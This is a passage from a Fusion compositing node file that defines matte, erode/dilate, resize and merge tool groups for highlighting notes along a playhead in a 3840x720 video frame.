									CustomData = { Settings = { [1] = { Tools = ordered() { MatteCrunch_54 = MatteControl { Inputs = { PostMultiplyImage = Input { Value = 1 }, MatteContractExpand = Input { Value = -0.15 }, LowMatteThreshold = Input { Value = 0.5 }, Filter = Input { Value = FuID { ""Fast Gaussian"" } }, [""Garbage.MaskInverted""] = Input { Value = 1 }, Background = Input { SourceOp = ""Dilate_108"", Source = ""Output"" }, MatteBlur = Input { Value = 0.1 }, [""Garbage.MaskNest""] = Input { Value = 1 } }, Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { 55, -16.5 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										MatteGamma = Input { Value = 3, },
										LowMatteThreshold = Input { Value = 0.411, },
										High = Input { Value = 0.411, },
										[""Garbage.Matte""] = Input {
											SourceOp = ""Bitmap_Nrml"",
											Source = ""Mask"",
										},
										[""Garbage.MaskNest""] = Input { Value = 1, },
										PostMultiplyImage = Input { Value = 1, },
										Background = Input {
											SourceOp = ""Dilate_Nrml"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 165, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								Erode_Nrml = ErodeDilate {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 2,
									CustomData = { Settings = { [1] = { Tools = ordered() { Erode_108 = ErodeDilate { Inputs = { Input = Input { SourceOp = ""PipeRouter3"", Source = ""Output"" }, XAmount = Input { Value = -0.0024 }, Filter = Input { Value = 3 } }, Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -163.395, 8.25757 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = 3, },
										XAmount = Input { Value = -0.0037, },
										Input = Input {
											SourceOp = ""CleanPlate_Nrml"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { -55, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								Wand_Nrml = WandMask {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										OutputSize = Input { Value = FuID { ""Custom"" }, },
										MaskWidth = Input { Value = 3840, },
										MaskHeight = Input { Value = 720, },
										PixelAspect = Input { Value = { 1, 1 }, },
										ClippingMode = Input { Value = FuID { ""None"" }, },
										Source = Input {
											SourceOp = ""PipeRouter6_4"",
											Source = ""Output"",
										},
										SelectionPoint = Input { Value = { 0.001, 0.001 }, },
										RangeSoftEdge = Input { Value = 1, },
									},
									ViewInfo = OperatorInfo { Pos = { -165, 115.5 } },
								}
							},
						}
					},
					Colors = { TileColor = { R = 0.372549019607843, G = 0.6, B = 0.125490196078431 }, }
				},
				RestNotes = GroupOperator {
					CtrlWShown = false,
					NameSet = true,
					Inputs = ordered() {
						Input1 = InstanceInput {
							SourceOp = ""PipeRouter7_8"",
							Source = ""Input"",
						}
					},
					Outputs = {
						Output1 = InstanceOutput {
							SourceOp = ""Prev_Note_OFF_Rest"",
							Source = ""Output"",
						}
					},
					ViewInfo = GroupInfo {
						Pos = { -110, 214.5 },
						Flags = {
							AllowPan = false,
							GridSnap = true,
							AutoSnap = true
						},
						Size = { 741.919, 355.061, 394.419, 147.94 },
						Direction = ""Vertical"",
						PipeStyle = ""Direct"",
						Scale = 1,
						Offset = { -45.5, -271.864 }
					},
					Tools = ordered() {
						PipeRouter7_8 = PipeRouter {
							CtrlWShown = false,
							Inputs = {
								Input = Input {
									SourceOp = ""ChangeDepthNote"",
									Source = ""Output"",
								},
							},
							ViewInfo = PipeRouterInfo { Pos = { -275, 280.5 } },
						},
						Downsize_Rest = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 960,
									Expression = ""NoteArea_Rest.Output.OriginalWidth/4"",
								},
								Height = Input { Value = 1, },
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""NoteArea_Rest"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 412.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Note_Invert_Rest = ChannelBoolean {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								ToRed = Input { Value = 15, },
								ToGreen = Input { Value = 15, },
								ToBlue = Input { Value = 15, },
								Background = Input {
									SourceOp = ""Upsize_Rest"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 220, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Prev_Note_OFF_Rest = Merge {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Background = Input {
									SourceOp = ""Note_Invert_Rest"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""This_Note_ON_Rest"",
									Source = ""Output"",
								},
								PerformDepthMerge = Input { Value = 0, },
							},
							ViewInfo = OperatorInfo { Pos = { 330, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						Note_CleanPlate_Rest = CleanPLate {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Method = Input { Value = FuID { ""Ranges"" }, },
								InsideFill = Input { Value = 1, },
								HoldTime = Input { Value = 35, },
								Input = Input {
									SourceOp = ""Downsize_Rest"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 379.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						This_Note_ON_Rest = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								EffectMask = Input {
									SourceOp = ""PipeRouter7_8"",
									Source = ""Output"",
								},
								MultiplyByMask = Input { Value = 1, },
								MatteCombine = Input { Value = 4, },
								CombineOp = Input { Value = 5, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								MatteBlur = Input { Value = 0.2, },
								MatteContractExpand = Input { Value = 0.46, },
								LowMatteThreshold = Input { Value = 0.05, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""Upsize_Rest"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""PipeRouter7_8"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 165, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						Upsize_Rest = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 3840,
									Expression = ""NoteArea_Rest.Output.OriginalWidth"",
								},
								Height = Input {
									Value = 720,
									Expression = ""NoteArea_Rest.Output.OriginalHeight"",
								},
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""Note_CleanPlate_Rest"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						NoteArea_Rest = Merge {
							CtrlWShown = false,
							NameSet = true,
							CustomData = { Settings = {
								} },
							Inputs = {
								EffectMask = Input {
									SourceOp = ""NoteMask_Rest"",
									Source = ""Mask"",
								},
								Background = Input {
									SourceOp = ""Clear_BG_Rest"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""NoteBG_Rest"",
									Source = ""Output"",
								},
								Center = Input {
									Value = { 0.155208333333333, 0.5 },
									Expression = ""Point((1/self.Width) * (AutoDomain_Rest.Output.DataWindow[3] - (NoteBG_Rest.Output.Width/2))/2, 0.5)"",
								},
								PerformDepthMerge = Input { Value = 0, },
								ReferenceSize = Input { Value = 1, },
								Width = Input { Value = 1920, },
								Height = Input { Value = 316, },
							},
							ViewInfo = OperatorInfo { Pos = { -110, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteBG_Rest = Background {
							CtrlWShown = false,
							NameSet = true,
							CustomData = { Settings = {
								} },
							Inputs = {
								GlobalOut = Input { Value = 399, },
								Width = Input {
									Value = 78,
									Expression = ""AutoDomain_Rest.Output.DataWindow[3]-AutoDomain_Rest.Output.DataWindow[1]"",
								},
								Height = Input {
									Value = 720,
									Expression = ""Clear_BG_Rest.Output.OriginalHeight"",
								},
								Depth = Input { Value = 1, },
								[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
								TopRightRed = Input { Value = 1, },
								TopRightGreen = Input { Value = 1, },
								TopRightBlue = Input { Value = 1, },
								BottomLeftRed = Input { Value = 1, },
								BottomLeftGreen = Input { Value = 0.5, },
								BottomRightGreen = Input { Value = 0.5, },
								BottomRightBlue = Input { Value = 1, },
								Start = Input { Value = { 0.5, 0.5 }, },
								Gradient = Input {
									Value = Gradient {
										Colors = {
											[0] = { 1, 1, 1, 1 },
											[1] = { 0, 0, 0, 1 }
										}
									},
								},
							},
							ViewInfo = OperatorInfo { Pos = { -110, 445.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteMask_Rest = RectangleMask {
							CtrlWShown = false,
							NameSet = true,
							CurrentSettings = 2,
							CustomData = { Settings = {
								} },
							Inputs = {
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								OutputSize = Input { Value = FuID { ""Custom"" }, },
								MaskWidth = Input {
									Value = 3840,
									Expression = ""ChangeDepthNote.Output.OriginalWidth"",
								},
								MaskHeight = Input {
									Value = 720,
									Expression = ""ChangeDepthNote.Output.OriginalHeight"",
								},
								PixelAspect = Input { Value = { 1, 1 }, },
								ClippingMode = Input { Value = FuID { ""None"" }, },
								Center = Input {
									Value = { -0.382587094674556, 0.5 },
									Expression = ""Point(Playhead.Center.X-0.5, 0.5)"",
								},
								Width = Input { Value = 1, },
								Height = Input { Value = 1, },
							},
							ViewInfo = OperatorInfo { Pos = { -220, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Clear_BG_Rest = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								MatteCombine = Input { Value = 6, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								LowMatteThreshold = Input { Value = 0.2, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""PipeRouter7_8"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { -165, 346.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteCleanup_Rest = GroupOperator {
							CtrlWShown = false,
							NameSet = true,
							Inputs = ordered() {
								Input1 = InstanceInput {
									SourceOp = ""PipeRouter6_6"",
									Source = ""Input"",
								}
							},
							Outputs = {
								Output1 = InstanceOutput {
									SourceOp = ""AutoDomain_Rest"",
									Source = ""Output"",
								}
							},
							ViewInfo = GroupInfo {
								Pos = { 0, 214.5 },
								Flags = {
									AllowPan = false,
									GridSnap = true,
									AutoSnap = true
								},
								Size = { 302.548, 122.259, 113.219, 60.5033 },
								Direction = ""Vertical"",
								PipeStyle = ""Direct"",
								Scale = 1,
								Offset = { -18, -108.341 }
							},
							Tools = ordered() {
								PipeRouter6_6 = PipeRouter {
									CtrlWShown = false,
									Inputs = {
										Input = Input {
											SourceOp = ""PipeRouter7_8"",
											Source = ""Output"",
										},
									},
									ViewInfo = PipeRouterInfo { Pos = { 0, 115.5 } },
								},
								AutoDomain_Rest = AutoDomain {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Input = Input {
											SourceOp = ""PipeRouter6_6"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 110, 115.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								}
							},
						}
					},
					Colors = { TileColor = { R = 0.549019607843137, G = 0.352941176470588, B = 0.247058823529412 }, }
				},
				MiniMes = GroupOperator {
					CtrlWShown = false,
					NameSet = true,
					Inputs = ordered() {
						Input1 = InstanceInput {
							SourceOp = ""PipeRouter7_7"",
							Source = ""Input"",
						}
					},
					Outputs = {
						Output1 = InstanceOutput {
							SourceOp = ""Prev_Note_OFF_MM"",
							Source = ""Output"",
						}
					},
					ViewInfo = GroupInfo {
						Pos = { 165, 115.5 },
						Flags = {
							AllowPan = false,
							GridSnap = true,
							AutoSnap = true
						},
						Size = { 701.044, 356.7, 347.5, 149.579 },
						Direction = ""Vertical"",
						PipeStyle = ""Direct"",
						Scale = 1,
						Offset = { -45.5, -271.864 }
					},
					Tools = ordered() {
						PipeRouter7_7 = PipeRouter {
							CtrlWShown = false,
							Inputs = {
								Input = Input {
									SourceOp = ""ChangeDepthNote"",
									Source = ""Output"",
								},
							},
							ViewInfo = PipeRouterInfo { Pos = { -275, 280.5 } },
						},
						Note_Invert_MM = ChannelBoolean {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								ToRed = Input { Value = 15, },
								ToGreen = Input { Value = 15, },
								ToBlue = Input { Value = 15, },
								Background = Input {
									SourceOp = ""Upsize_MM"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 220, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Downsize_MM = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 960,
									Expression = ""NoteArea_MM.Output.OriginalWidth/4"",
								},
								Height = Input { Value = 1, },
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""NoteArea_MM"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 412.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						NoteMask_MM = RectangleMask {
							CtrlWShown = false,
							NameSet = true,
							CurrentSettings = 2,
							CustomData = { Settings = { [1] = { Tools = ordered() { NoteMask_54 = RectangleMask { Inputs = { MaskWidth = Input { Value = 1920 }, OutputSize = Input { Value = FuID { ""Custom"" } }, MaskHeight = Input { Value = 316 }, ClippingMode = Input { Value = FuID { ""None"" } }, Center = Input { Value = { 0.353345134122288, 0.5 }, Expression = ""Point(Playhead.Center.X-0.5, 0.5)"" }, Filter = Input { Value = FuID { ""Fast Gaussian"" } }, Height = Input { Value = 1 }, Width = Input { Value = 1 }, UseFrameFormatSettings = Input { Value = 1 }, PixelAspect = Input { Value = { 1, 1 } } }, Colors = { TileColor = { B = 0.0823529411764706, G = 0.776470588235294, R = 0.623529411764706 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -220, 181.5 } }, CustomData = {
												} } } } } },
							Inputs = {
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								OutputSize = Input { Value = FuID { ""Custom"" }, },
								MaskWidth = Input {
									Value = 3840,
									Expression = ""ChangeDepthNote.Output.OriginalWidth"",
								},
								MaskHeight = Input {
									Value = 720,
									Expression = ""ChangeDepthNote.Output.OriginalHeight"",
								},
								PixelAspect = Input { Value = { 1, 1 }, },
								ClippingMode = Input { Value = FuID { ""None"" }, },
								Center = Input {
									Value = { 0.174618735700197, 0.5 },
									Expression = ""Point(Playhead.Center.X-0.5, 0.5)"",
								},
								Width = Input { Value = 1, },
								Height = Input { Value = 1, },
							},
							ViewInfo = OperatorInfo { Pos = { -220, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Clear_BG_MM = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								MatteCombine = Input { Value = 6, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								LowMatteThreshold = Input { Value = 0.2, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""PipeRouter7_7"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { -165, 346.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Prev_Note_OFF_MM = Merge {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Background = Input {
									SourceOp = ""Note_Invert_MM"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""This_Note_ON_MM"",
									Source = ""Output"",
								},
								PerformDepthMerge = Input { Value = 0, },
							},
							ViewInfo = OperatorInfo { Pos = { 330, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						This_Note_ON_MM = MatteControl {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								EffectMask = Input {
									SourceOp = ""PipeRouter7_7"",
									Source = ""Output"",
								},
								MultiplyByMask = Input { Value = 1, },
								MatteCombine = Input { Value = 4, },
								CombineOp = Input { Value = 5, },
								Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
								MatteBlur = Input { Value = 0.2, },
								MatteContractExpand = Input { Value = 0.46, },
								LowMatteThreshold = Input { Value = 0.05, },
								[""Garbage.MaskNest""] = Input { Value = 1, },
								[""Garbage.MaskInverted""] = Input { Value = 1, },
								PostMultiplyImage = Input { Value = 1, },
								Background = Input {
									SourceOp = ""Upsize_MM"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""PipeRouter7_7"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 165, 280.5 } },
							Colors = { TileColor = { R = 0.725490196078431, G = 0.690196078431373, B = 0.592156862745098 }, }
						},
						NoteArea_MM = Merge {
							CtrlWShown = false,
							NameSet = true,
							CurrentSettings = 2,
							CustomData = { Settings = { [1] = { Tools = ordered() { NoteArea_54 = Merge { Inputs = { Height = Input { Value = 316 }, ReferenceSize = Input { Value = 1 }, Center = Input { Value = { 1.63463541666667, 0.5 }, Expression = ""Point((1/self.Width) * (AutoDomain_54.Output.DataWindow[3] - (NoteBG_54.Output.Width/2)), 0.5)"" }, PerformDepthMerge = Input { Value = 0 }, Foreground = Input { SourceOp = ""NoteBG_54"", Source = ""Output"" }, Background = Input { SourceOp = ""Clear_BG_54"", Source = ""Output"" }, EffectMask = Input { SourceOp = ""NoteMask_54"", Source = ""Mask"" }, Width = Input { Value = 1920 } }, Colors = { TileColor = { B = 0.0823529411764706, G = 0.776470588235294, R = 0.623529411764706 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -110, 181.5 } }, CustomData = {
												} } } } } },
							Inputs = {
								EffectMask = Input {
									SourceOp = ""NoteMask_MM"",
									Source = ""Mask"",
								},
								Background = Input {
									SourceOp = ""Clear_BG_MM"",
									Source = ""Output"",
								},
								Foreground = Input {
									SourceOp = ""NoteBG_MM"",
									Source = ""Output"",
								},
								Center = Input {
									Value = { 0.155598958333333, 0.5 },
									Expression = ""Point((1/self.Width) * (AutoDomain_MM.Output.DataWindow[3] - (NoteBG_MM.Output.Width/2))/2, 0.5)"",
								},
								PerformDepthMerge = Input { Value = 0, },
								ReferenceSize = Input { Value = 1, },
								Width = Input { Value = 1920, },
								Height = Input { Value = 316, },
							},
							ViewInfo = OperatorInfo { Pos = { -110, 412.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						NoteBG_MM = Background {
							CtrlWShown = false,
							NameSet = true,
							CustomData = { Settings = {
								} },
							Inputs = {
								GlobalOut = Input { Value = 399, },
								Width = Input {
									Value = 50,
									Expression = ""AutoDomain_MM.Output.DataWindow[3]-AutoDomain_MM.Output.DataWindow[1]"",
								},
								Height = Input {
									Value = 720,
									Expression = ""Clear_BG_MM.Output.OriginalHeight"",
								},
								Depth = Input { Value = 1, },
								[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
								TopLeftRed = Input { Value = 1, },
								TopLeftGreen = Input { Value = 1, },
								TopLeftBlue = Input { Value = 1, },
								TopRightRed = Input { Value = 1, },
								TopRightGreen = Input { Value = 1, },
								TopRightBlue = Input { Value = 1, },
								BottomLeftRed = Input { Value = 1, },
								BottomLeftGreen = Input { Value = 0.5, },
								BottomRightGreen = Input { Value = 0.5, },
								BottomRightBlue = Input { Value = 1, },
								Start = Input { Value = { 0.5, 0.5 }, },
								Gradient = Input {
									Value = Gradient {
										Colors = {
											[0] = { 1, 1, 1, 1 },
											[1] = { 0, 0, 0, 1 }
										}
									},
								},
							},
							ViewInfo = OperatorInfo { Pos = { -110, 445.5 } },
							Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
						},
						Note_CleanPlate_MM = CleanPLate {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Method = Input { Value = FuID { ""Ranges"" }, },
								InsideFill = Input { Value = 1, },
								HoldTime = Input { Value = 35, },
								Input = Input {
									SourceOp = ""Downsize_MM"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 379.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						Upsize_MM = BetterResize {
							CtrlWShown = false,
							NameSet = true,
							Inputs = {
								Width = Input {
									Value = 3840,
									Expression = ""NoteArea_MM.Output.OriginalWidth"",
								},
								Height = Input {
									Value = 720,
									Expression = ""NoteArea_MM.Output.OriginalHeight"",
								},
								HiQOnly = Input { Value = 0, },
								PixelAspect = Input { Value = { 1, 1 }, },
								FilterMethod = Input { Value = 0, },
								Input = Input {
									SourceOp = ""Note_CleanPlate_MM"",
									Source = ""Output"",
								},
							},
							ViewInfo = OperatorInfo { Pos = { 55, 346.5 } },
							Colors = { TileColor = { R = 0.474509803921569, G = 0.658823529411765, B = 0.815686274509804 }, }
						},
						NoteCleanup_MM = GroupOperator {
							CtrlWShown = false,
							NameSet = true,
							Inputs = ordered() {
								Input1 = InstanceInput {
									SourceOp = ""PipeRouter6_5"",
									Source = ""Input"",
								}
							},
							Outputs = {
								Output1 = InstanceOutput {
									SourceOp = ""AutoDomain_MM"",
									Source = ""Output"",
								}
							},
							ViewInfo = GroupInfo {
								Pos = { 55, 214.5 },
								Flags = {
									AllowPan = false,
									GridSnap = true,
									AutoSnap = true
								},
								Size = { 660.055, 122.259, 320, 60.5033 },
								Direction = ""Vertical"",
								PipeStyle = ""Direct"",
								Scale = 1,
								Offset = { -18, -108.341 }
							},
							Tools = ordered() {
								PipeRouter6_5 = PipeRouter {
									CtrlWShown = false,
									Inputs = {
										Input = Input {
											SourceOp = ""PipeRouter7_7"",
											Source = ""Output"",
										},
									},
									ViewInfo = PipeRouterInfo { Pos = { -275, 148.5 } },
								},
								Wand_MM = WandMask {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										OutputSize = Input { Value = FuID { ""Custom"" }, },
										MaskWidth = Input { Value = 3840, },
										MaskHeight = Input { Value = 720, },
										PixelAspect = Input { Value = { 1, 1 }, },
										ClippingMode = Input { Value = FuID { ""None"" }, },
										Source = Input {
											SourceOp = ""PipeRouter6_5"",
											Source = ""Output"",
										},
										SelectionPoint = Input { Value = { 0.001, 0.001 }, },
										RangeSoftEdge = Input { Value = 1, },
									},
									ViewInfo = OperatorInfo { Pos = { -165, 115.5 } },
								},
								Bitmap_MM = BitmapMask {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										MaskWidth = Input { Value = 1920, },
										MaskHeight = Input { Value = 316, },
										PixelAspect = Input { Value = { 1, 1 }, },
										UseFrameFormatSettings = Input { Value = 1, },
										ClippingMode = Input { Value = FuID { ""None"" }, },
										Image = Input {
											SourceOp = ""Wand_MM"",
											Source = ""Mask"",
										},
										Channel = Input { Value = FuID { ""Luminance"" }, },
										Low = Input { Value = 0.5, },
										High = Input { Value = 0.5, },
									},
									ViewInfo = OperatorInfo { Pos = { 55, 115.5 } },
								},
								AutoDomain_MM = AutoDomain {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										Input = Input {
											SourceOp = ""MatteCrunch_MM"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 275, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								MatteCrunch_MM = MatteControl {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 2,
									CustomData = { Settings = { [1] = { Tools = ordered() { MatteCrunch_54 = MatteControl { Inputs = { PostMultiplyImage = Input { Value = 1 }, MatteContractExpand = Input { Value = -0.15 }, [""Garbage.MaskNest""] = Input { Value = 1 }, Filter = Input { Value = FuID { ""Fast Gaussian"" } }, MatteBlur = Input { Value = 0.1 }, Background = Input { SourceOp = ""Dilate_108"", Source = ""Output"" }, [""Garbage.MaskInverted""] = Input { Value = 1 }, LowMatteThreshold = Input { Value = 0.5 } }, Colors = { TileColor = { B = 0, G = 0.431372549019608, R = 0.92156862745098 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { 55, -16.5 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
										MatteGamma = Input { Value = 3, },
										LowMatteThreshold = Input { Value = 0.411, },
										High = Input { Value = 0.411, },
										[""Garbage.Matte""] = Input {
											SourceOp = ""Bitmap_MM"",
											Source = ""Mask"",
										},
										[""Garbage.MaskNest""] = Input { Value = 1, },
										PostMultiplyImage = Input { Value = 1, },
										Background = Input {
											SourceOp = ""Dilate_MM"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 165, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								Dilate_MM = ErodeDilate {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 2,
									CustomData = { Settings = { [1] = { Tools = ordered() { Dilate_108 = ErodeDilate { Inputs = { Input = Input { SourceOp = ""Erode_108"", Source = ""Output"" }, XAmount = Input { Value = 0.0026 }, Filter = Input { Value = 3 } }, Colors = { TileColor = { B = 0, G = 0.431372549019608, R = 0.92156862745098 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -55, 9.51468 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = 3, },
										XAmount = Input { Value = 0.00242, },
										Input = Input {
											SourceOp = ""Erode_MM"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { 55, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								Erode_MM = ErodeDilate {
									CtrlWShown = false,
									NameSet = true,
									CurrentSettings = 3,
									CustomData = { Settings = { [1] = { Tools = ordered() { Erode_108 = ErodeDilate { Inputs = { Input = Input { SourceOp = ""PipeRouter3"", Source = ""Output"" }, XAmount = Input { Value = -0.0024 }, Filter = Input { Value = 3 } }, Colors = { TileColor = { B = 0, G = 0.431372549019608, R = 0.92156862745098 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -163.395, 8.25757 } }, CustomData = {
														} } } }, [2] = { Tools = ordered() { Erode_116 = ErodeDilate { Inputs = { Input = Input { SourceOp = ""CleanPlate1_116"", Source = ""Output"" }, XAmount = Input { Value = -0.0037 }, Filter = Input { Value = 3 } }, Colors = { TileColor = { B = 0, G = 0.431372549019608, R = 0.92156862745098 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { -55, 148.5 } }, CustomData = {
														} } } } } },
									Inputs = {
										Filter = Input { Value = 3, },
										XAmount = Input { Value = -0.0021, },
										Input = Input {
											SourceOp = ""CleanPlate_MM"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { -55, 148.5 } },
									Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
								},
								CleanPlate_MM = CleanPLate {
									CtrlWShown = false,
									NameSet = true,
									Inputs = {
										EffectMask = Input {
											SourceOp = ""Wand_MM"",
											Source = ""Mask"",
										},
										ApplyMaskInverted = Input { Value = 1, },
										MultiplyByMask = Input { Value = 1, },
										Method = Input { Value = FuID { ""Ranges"" }, },
										GrowEdges = Input { Value = 0.2, },
										InsideFill = Input { Value = 1, },
										HoldTime = Input { Value = 35, },
										[""Garbage.MaskNest""] = Input { Value = 1, },
										Input = Input {
											SourceOp = ""PipeRouter6_5"",
											Source = ""Output"",
										},
									},
									ViewInfo = OperatorInfo { Pos = { -165, 148.5 } },
								}
							},
						}
					},
					Colors = { TileColor = { R = 0.913725490196078, G = 0.549019607843137, B = 0.709803921568627 }, }
				}
			},
		},
		Set_Playhead_Area = Underlay {
			NameSet = true,
